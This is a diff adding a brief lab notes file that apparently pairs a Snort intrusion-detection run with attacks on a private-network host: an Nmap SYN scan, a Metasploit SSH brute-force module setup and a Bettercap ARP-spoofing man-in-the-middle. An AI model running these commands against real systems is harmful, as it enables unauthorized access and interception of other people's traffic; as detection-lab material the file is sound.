@@ -1,0 +1,19 @@
+# Start Snort
+sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
+
+# Nmap scan
+nmap -sS 192.168.146.128
+
+# Metasploit SSH brute force
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.146.128
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+run
+
+# Bettercap MITM
+bettercap -iface eth0
+net.probe on
+net.show
+set arp.spoof.targets 192.168.146.128
+arp.spoof on
